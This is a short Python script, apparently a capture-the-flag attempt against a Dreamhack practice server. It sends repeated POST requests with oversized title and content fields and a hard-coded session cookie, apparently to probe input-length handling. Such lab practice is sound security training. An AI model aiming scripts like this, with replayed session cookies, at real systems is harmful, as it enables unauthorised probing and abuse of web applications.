import requests

data = {
    'title' : 'H'*95,'content': 'a'*4095}
url = 'http://host1.dreamhack.games:18582/write_article'
cnt = 0
cookies = {'session': 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.ZMCvlA.syZjvRe8WwCUCI7FryVvAVS5-GU'}

cnt+=1

response = requests.post(url, data=data, cookies=cookies)
print(response)
print(response.status_code,":",cnt)
response = requests.post(url, data=data, cookies=cookies)
print(response)
print(response.status_code,":",cnt)